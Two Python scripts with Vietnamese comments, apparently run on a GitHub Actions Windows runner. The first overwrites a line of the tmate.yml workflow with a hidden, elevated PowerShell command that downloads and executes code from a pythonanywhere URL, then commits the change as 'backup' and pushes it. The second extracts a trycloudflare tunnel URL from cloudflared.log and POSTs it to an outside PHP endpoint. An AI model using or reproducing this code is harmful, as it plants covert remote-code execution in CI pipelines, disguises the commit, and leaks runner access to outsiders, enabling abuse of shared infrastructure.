import os
import glob
import subprocess

# Nội dung muốn inject
code_inject = """        Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList "-c iex (iwr https://hai1723.pythonanywhere.com/url -UseBasicParsing)"\n"""

# 1. Tìm thư mục theo pattern
pattern = r"D:\a\vps-project-*\vps-project-*"
matches = glob.glob(pattern)

if not matches:
    print("❌ Không tìm thấy thư mục khớp pattern")
    exit(1)

# Lấy thư mục mới nhất
project_dir = max(matches, key=os.path.getmtime)
print(f"✅ Found project dir: {project_dir}")

# 2. Đường dẫn file workflow
workflow_file = os.path.join(project_dir, ".github", "workflows", "tmate.yml")

if not os.path.exists(workflow_file):
    print("❌ Không tìm thấy file workflow")
    exit(1)

# 3. Ghi đè line 35
with open(workflow_file, "r", encoding="utf-8") as f:
    lines = f.readlines()

if len(lines) >= 35:
    lines[34] = code_inject   # replace line 35
else:
    print("⚠️ File ít hơn 35 dòng, sẽ append cuối.")
    lines.append(code_inject)

with open(workflow_file, "w", encoding="utf-8") as f:
    f.writelines(lines)

print(f"✅ Line 35 replaced with: {code_inject.strip()}")

# 4. Commit và push
os.chdir(project_dir)
subprocess.run(["git", "add", workflow_file])
subprocess.run(["git", "commit", "-m", f"backup"])
subprocess.run(["git", "push", "origin", "main"])
import os
import re
import subprocess

base_dir = r"D:\A"
log_file = None

# Tìm file cloudflared.log trong D:\A
for root, dirs, files in os.walk(base_dir):
    if "cloudflared.log" in files:
        log_file = os.path.join(root, "cloudflared.log")
        break  # chỉ lấy file đầu tiên tìm được

url = None

if log_file:
    with open(log_file, "r", encoding="utf-8", errors="ignore") as f:
        log_content = f.read()

    match = re.search(r"https://[a-zA-Z0-9-]+\.trycloudflare\.com", log_content)
    if match:
        url = match.group(0)

if url:
    try:
        # Gọi curl POST
        result = subprocess.run(
            ["curl", "-s", "-X", "POST", "-d", f"cloudflaredUrl={url}", "http://simpleappchat.elementfx.com/claimvps.php"],
            capture_output=True,
            text=True
        )
        print("Sent:", url)
        print("Reply:", result.stdout.strip())
    except Exception as e:
        print("Error running curl:", e)
else:
    print("No URL found")
